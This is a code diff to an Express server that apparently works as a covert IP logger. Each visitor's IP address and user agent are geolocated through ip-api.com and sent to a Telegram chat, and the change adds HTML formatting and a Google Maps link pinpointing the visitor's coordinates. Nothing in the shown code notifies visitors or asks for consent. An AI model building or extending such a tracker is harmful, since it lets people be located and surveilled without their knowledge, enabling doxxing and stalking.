@@ -11,7 +11,8 @@ const sendToTelegram = (message) => {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   axios.post(url, {
     chat_id: TELEGRAM_CHAT_ID,
-    text: message
+    text: message,
+    parse_mode: 'HTML'
   }).catch(err => console.error('Error sending message:', err));
 };
 
@@ -24,7 +25,9 @@ app.get('/', async (req, res) => {
   try {
     const response = await axios.get(`http://ip-api.com/json/${ip}`);
     const location = response.data;
-    sendToTelegram(`New Visitor:\nIP: ${ip}\nUser Agent: ${userAgent}\nCountry: ${location.country}\nRegion: ${location.regionName}\nCity: ${location.city}\nLatitude: ${location.lat}\nLongitude: ${location.lon}`);
+    const googleMapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
+
+    sendToTelegram(`New Visitor:\nIP: ${ip}\nUser Agent: ${userAgent}\nCountry: ${location.country}\nRegion: ${location.regionName}\nCity: ${location.city}\nLatitude: ${location.lat}\nLongitude: ${location.lon}\n\n<a href="${googleMapsLink}">View on Google Maps</a>`);
   } catch (err) {
     console.error('Error fetching location:', err);
   }
